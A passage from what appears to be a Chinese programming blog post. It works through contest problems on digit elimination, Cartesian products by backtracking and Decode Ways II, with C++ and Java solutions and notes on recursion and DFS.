class="built_in">string</span>::npos)&#123;</span><br><span class="line">            result+=s2[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="数字消除"><a href="#数字消除" class="headerlink" title="数字消除"></a>数字消除</h6><p><strong>题目描述：</strong></p>
<p>给定一个数字构成的字符串，如果连着两个数字都相同，则可以消除，消除后前部分和后部分会连在一起，可以继续进行消除，现在问你能消除几次？</p>
<p>$1 \leq len(s) \leq 1000000$</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">Example <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Input: <span class="string">&quot;43211234&quot;</span></span><br><span class="line">Output: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">Example <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Input: <span class="string">&quot;101&quot;</span></span><br><span class="line">Output: <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong>遍历字符串，判断当前字符与下一位置字符是否相同，相同则使用earse函数删除相同的这两个字符，然后回退到上一个字符进行判断。注意特殊情况前两个字符相同时不进行回退。</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param Numbers: a string of Numbers</span></span><br><span class="line"><span class="comment">     * @return: returns the number of eliminations</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">NumberOfErasures</span><span class="params">(<span class="built_in">string</span> &amp;Numbers)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write your code here.</span></span><br><span class="line">        <span class="comment">//记录消除次数</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;Numbers.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(Numbers[i]==Numbers[i+<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="comment">//string erase函数删除从i开始的2个字符</span></span><br><span class="line">                Numbers.erase(i,<span class="number">2</span>);</span><br><span class="line">                result+=<span class="number">1</span>;</span><br><span class="line">                <span class="comment">//结束五分之后才改完这个错误提交成功，没计算成绩</span></span><br><span class="line">                <span class="comment">//特殊情况，前两个字符就匹配上的话要特殊处理</span></span><br><span class="line">                <span class="keyword">if</span>(i==<span class="number">0</span>)&#123;</span><br><span class="line">                    i-=<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    i-=<span class="number">2</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h6 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h6><p><strong>题目描述：</strong></p>
<p>我们采用二维数组setList[][]表示集合数组，其中setList[i]中的每个元素都为整数，且不相同。求集合setList[0],setList[1],…,setList[setList.length - 1]的笛卡尔积。 一般地，集合A和集合B的笛卡尔积A×B = {(x,y)|x∈A∧y∈B}。</p>
<ul>
<li><code>1 &lt;= setList.length &lt;= 5</code></li>
<li><code>1 &lt;= setList[i].length &lt;= 5</code></li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入:</span><br><span class="line">setList = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>],[<span class="number">5</span>,<span class="number">6</span>]]</span><br><span class="line">输出: [[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>]]</span><br><span class="line">解释:</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]和[<span class="number">4</span>]和[<span class="number">5</span>,<span class="number">6</span>]的笛卡尔积为[[<span class="number">1</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">1</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>]]</span><br><span class="line"></span><br><span class="line">样例<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入:</span><br><span class="line">setList = [[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>]]</span><br><span class="line">输出: [[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line">解释:</span><br><span class="line">[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]和[<span class="number">4</span>]的笛卡尔积为[[<span class="number">1</span>,<span class="number">4</span>],[<span class="number">2</span>,<span class="number">4</span>],[<span class="number">3</span>,<span class="number">4</span>]]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong></p>
<p>这道题自己没做出来，本来是想遍历setList中的每个向量元素，有多少个向量元素就写多少个for循环，但是向量元素的个数不确定没办法写for循环不知道写几个，不过setListl.length&lt;=5,可以穷举出来所有的可能🤣可以用很多个for循环穷举（个数为2时2个for循环为3时3个for循环…也可以写5个for循环循环前添加判断条件，循环中用push_back(),pop_back(),这种循环其实就是回溯法），网上参考了别的资料，这道题是要用回溯求解，代码如下：</p>
<p><strong>回溯代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param setList: The input set list</span></span><br><span class="line"><span class="comment">     * @return: the cartesian product of the set list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//存储最后结果</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">    <span class="comment">//存储最后结果中的一个元素</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; lv;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">getSet</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;setList)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//Write your code here</span></span><br><span class="line">        dfs(setList,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//DFS（深度优先搜索），回溯法</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;setList,<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(i==setList.size())&#123;</span><br><span class="line">            ans.push_back(lv);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;setList[i].size();j++)&#123;</span><br><span class="line">            lv.push_back(setList[i][j]);</span><br><span class="line">            dfs(setList,i+<span class="number">1</span>);</span><br><span class="line">            lv.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="解码方式"><a href="#解码方式" class="headerlink" title="解码方式"></a>解码方式</h6><p><strong>题目描述：</strong></p>
<p>使用以下映射方式将 A-Z 的消息编码为数字:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;A&#39; -&gt; 1</span><br><span class="line">&#39;B&#39; -&gt; 2</span><br><span class="line">...</span><br><span class="line">&#39;Z&#39; -&gt; 26</span><br></pre></td></tr></table></figure>
<p>除此之外, 编码的字符串也可以包含字符 <code>*</code>, 它代表了 1 到 9 的数字中的其中一个.给出包含数字和字符 <code>*</code> 的编码消息, 返回所有解码方式的数量. 因为结果可能很大, 所以结果需要对 10^9 + 7 取模</p>
<ul>
<li>输入的字符串在范围 [1, 10^5] 内.</li>
<li>输入的字符串只能包含字符 <code>*</code> 和数字 <code>0</code> - <code>9</code>.</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入: <span class="string">&quot;*&quot;</span></span><br><span class="line">输出: <span class="number">9</span></span><br><span class="line">说明: 你可以译码为 <span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>, <span class="string">&quot;C&quot;</span>, <span class="string">&quot;D&quot;</span>, <span class="string">&quot;E&quot;</span>, <span class="string">&quot;F&quot;</span>, <span class="string">&quot;G&quot;</span>, <span class="string">&quot;H&quot;</span>, <span class="string">&quot;I&quot;</span>.</span><br><span class="line"></span><br><span class="line">样例<span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入: <span class="string">&quot;1*&quot;</span></span><br><span class="line">输出: <span class="number">18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong></p>
<p>这道题比赛时根本没时间看，后来看完一顿乱写，越写越迷，真的还是要有思路，不能是乱碰乱撞式写法，这道题比较复杂，是LeetCode上面的原题<a href="https://leetcode-cn.com/problems/decode-ways-ii">解码方法2</a>，还有一道相似的更基础版的题<a href="https://leetcode-cn.com/problems/decode-ways">解码方法</a></p>
<p>我现在太菜了😆，题解也看得似懂非懂，这道题确实也挺难的，就先把官方题解放在下面</p>
<p><strong>方法一：记忆性递归</strong><br><strong>算法</strong></p>
<p>对输入的字符序列，考虑每种可能的解码情况。</p>
<p>假设有函数 <code>ways(s,i)</code>，返回字符串 ss 中前 ii 个字符的解码方法数量。调用 <code>ways(s, s.length()-1)</code> 得到字符串中所有字符的解码方法数量。</p>
<p>我们从字符串 ss 的最后一个字符开始解码，假设此时调用函数 <code>ways(s,i)</code>。在 <code>ways(s,i)</code> 中计算前 i 个字符的所有解码方法数量。第 i 个字符有以下几种情况。</p>
<p>第 i 个字符是 <code>*</code>。首先考虑第$ i$ 个字符单独解码的情况，<code>*</code> 表示 1-9 中任意一个数字，对应 <code>A-I</code> 中任意一个字母。前 i 个字符的解码可以表示为在前 $i−1$ 个字符解码的结尾加上 <code>A-I</code> 中任意一个字母。因此总的解码数量为前$ n-1$个字符解码数量的 9 倍，即 <code>9*ways(s,i-1)</code>。</p>
<p>除此之外，第 $ i$  个字符也可以和第 $i−1$ 个字符一起解码。如果第$ i-1$  个字符是 <code>1</code>，它们可以表示 <code>11-19</code> 中任意一个数字，对应 <code>K-S</code> 中任意一个字母。前 $ i$  个字符的解码可以表示为在前 $i−2$ 个字符解码的结尾加上 <code>K-S</code> 中任意一个字母。因此总的解码数量为前$n−2$ 个字符解码数量的 9 倍，即 <code>9*ways(s,i-2)</code>。需要注意的是使用两个字符 <code>1*</code> 一起解码和两个字符分开单独解码的结果不重复。</p>
<p>如果第$i−1$ 个字符是 <code>2</code>，那么 <code>2*</code> 可以表示 <code>21-26</code> 中任意一个数字，对应 <code>U-Z</code> 中任意一个字母。总的解码数量是前$i−2$ 个字符解码数量的 6 倍，即 <code>6*ways(s,i-2)</code>。</p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways3.PNG" alt="解码方式"></p>
<p>如果第 $i−1$ 个字符是 <code>*，</code>那么<code>**</code> 可以表示 <code>11-19</code>（9）和 <code>21-26</code>（6） 中任意一个数字。因此总的解码数量是前 $i−2$ 个字符解码数量的 15（9+6） 倍，即 <code>15*ways(s,i-2)</code>。</p>
<p>如果第 $i$ 个字符是 <code>1-9</code> 的数字。首先考虑单个字符解码的情况。此时前 $i$ 个字符的解码数量等于前 $i-1$ 个字符的解码数量。如果第 $i$ 个字符是 <code>0</code>，那么它不能单独解码，必须与它的前一个字符一起解码。前一个字符是 <code>1</code>，<code>2</code> 或 <code>*</code> 时才可以解码。具体情况如下。</p>
<p>如果前一个字符是 <code>1</code>，那么它们可以是 <code>10-19</code> 中任意一个数字。此时解码数量等于前 $i-2$ 个字符的解码数量。</p>
<p>如果前一个字符是 <code>2</code>，则有效数字范围为 <code>20-26</code>。只有当前字符小于 7 时可以解码。此时解码数量等于前 $i−2$ 个字符的解码数量。</p>
<p>如果前一个字符是 <code>*</code>，那么解码数量取决于当前数字。如果当前数字大于 6，那么它们只能是 <code>17-19</code> 中任意一个（<code>27-29</code> 是无效的解码数字）。此时解码数量等于前$i−2$ 个字符的解码数量。</p>
<p>如果当前数字小于 <code>7</code>，则 <code>*</code> 可以是 <code>1</code> 或 <code>2</code>。对应 <code>10-16</code> 或者 <code>20-26</code> 中任意一个数字。此时解码数量等于前$i−2$ 个字符解码数量的 2 倍。</p>
<p>在函数 <code>ways</code> 中实现所有的情况，递归调用 <code>ways</code> 计算所有字符的解码数量。记录已经计算出来的前 $i$ 个字符的解码数量，减少重复调用，降低计算复杂度。</p>
<p>Java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        Integer[] memo=<span class="keyword">new</span> Integer[s.length()];</span><br><span class="line">        <span class="keyword">return</span> ways(s, s.length() - <span class="number">1</span>,memo);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">ways</span><span class="params">(String s, <span class="keyword">int</span> i,Integer[] memo)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(memo[i]!=<span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> memo[i];</span><br><span class="line">        <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">long</span> res = <span class="number">9</span> * ways(s, i - <span class="number">1</span>,memo);</span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">9</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">6</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                res = (res + <span class="number">15</span> * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">            memo[i]=(<span class="keyword">int</span>)res;</span><br><span class="line">            <span class="keyword">return</span> memo[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> res = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? ways(s, i - <span class="number">1</span>,memo) : <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            res = (res + ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            res = (res + ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                res = (res + (s.charAt(i)&lt;=<span class="string">&#x27;6&#x27;</span>?<span class="number">2</span>:<span class="number">1</span>) * ways(s, i - <span class="number">2</span>,memo)) % M;</span><br><span class="line">        memo[i]= (<span class="keyword">int</span>)res;</span><br><span class="line">        <span class="keyword">return</span> memo[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 表示输入字符串和备忘录数组的长度，备忘录数组中每项计算时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(n)$，递归树的深度为 $n$。</p>
</li>
</ul>
<p><strong>方法二：动态规划</strong><br><strong>算法</strong></p>
<p>从 方法一 可以看出，字符串前 $i$ 个字符的解码方法数量只与前 $i$ 个字符有关，与它后面的字符无关。因此该问题也可以使用动态规划解决。</p>
<p>如果知道字符串前 $i−1$ 个字符的解码数量和前 $i−2$ 个字符的解码数量，就可以计算出前 $i$ 个字符的解码数量。从前往后计算数组 $dp$ 中每一项，$dp[i]$ 表示字符串 $s$ 前 $i$ 个字符的编码数量。</p>
<p>通过一个简单实例的图解说明 $dp$ 的计算过程。</p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide1.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide2.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide3.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide4.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide5.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide6.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide7.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide8.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide9.PNG" alt="img"></p>
<p><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/639_Decode_Ways_IISlide10.PNG" alt="img"></p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span>[] dp = <span class="keyword">new</span> <span class="keyword">long</span>[s.length() + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>] = s.charAt(<span class="number">0</span>) == <span class="string">&#x27;*&#x27;</span> ? <span class="number">9</span> : s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>] = <span class="number">9</span> * dp[i];</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">9</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">6</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + <span class="number">15</span> * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>] = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? dp[i] : <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    dp[i + <span class="number">1</span>] = (dp[i + <span class="number">1</span>] + (s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span> ? <span class="number">2</span> : <span class="number">1</span>) * dp[i - <span class="number">1</span>]) % M;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) dp[s.length()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(n)$，其中 $n$ 是输入字符串的长度，数组 $dp$ 长度为 $n+1$，计算数组每一项的时间复杂度为 $O(1)$。</p>
</li>
<li><p>空间复杂度：$O(n)$，数组 $dp$ 的长度为 $n+1$。</p>
</li>
</ul>
<p><strong>方法三：恒定空间的动态规划</strong><br><strong>算法</strong></p>
<p>只要知道 $dp[i-2]$ 和 $dp[i-1]$ 就可以计算出 $dp[i]$。因此不需要保存数组 $dp$ 的所有值，只需要记录数组 $dp$ 的最后两个值就可以计算出下一项。其他过程与 方法二 相同。</p>
<p><strong>Java代码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> M = <span class="number">1000000007</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numDecodings</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> first = <span class="number">1</span>, second = s.charAt(<span class="number">0</span>) == <span class="string">&#x27;*&#x27;</span> ? <span class="number">9</span> : s.charAt(<span class="number">0</span>) == <span class="string">&#x27;0&#x27;</span> ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; s.length(); i++) &#123;</span><br><span class="line">            <span class="keyword">long</span> temp = second;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                second = <span class="number">9</span> * second;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">9</span> * first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">6</span> * first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    second = (second + <span class="number">15</span> * first) % M;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                second = s.charAt(i) != <span class="string">&#x27;0&#x27;</span> ? second : <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">                    second = (second + first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;2&#x27;</span> &amp;&amp; s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">                    second = (second + first) % M;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">                    second = (second + (s.charAt(i) &lt;= <span class="string">&#x27;6&#x27;</span> ? <span class="number">2</span> : <span class="number">1</span>) * first) % M;</span><br><span class="line">            &#125;</span><br><span class="line">            first = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>) second;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 是输入字符串的长度，需要计算到第 $n$ 次才能得到所有字符的解码数量。</li>
<li>空间复杂度：$O(1)$，使用恒定空间。</li>
</ul>
<h6 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h6><p><strong>递归、回溯和DFS的区别</strong></p>
<ul>
<li>递归是一种算法结构，回溯是一种算法思想。</li>
<li>一个递归就是在函数中调用函数本身来解决问题。</li>
<li>回溯就是通过不同的尝试来生成问题的解，有点类似于穷举，但是和穷举不同的是回溯会“剪枝”</li>
</ul>
<p>回溯搜索是深度优先搜索（DFS）的一种。对于某一个搜索树来说（搜索树是起记录路径和状态判断的作用），回溯和DFS主要的区别是，回溯法在求解过程中不保留完整的树形结构，而深度优先搜索则记下完整的搜索树。</p>
<p><strong>递归的一般结构</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">     <span class="keyword">if</span>(符合边界条件)  </span><br><span class="line">     &#123;  </span><br><span class="line">        <span class="comment">///////  </span></span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">     &#125;  </span><br><span class="line"></span><br><span class="line">     <span class="comment">//某种形式的调用  </span></span><br><span class="line">     f();  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
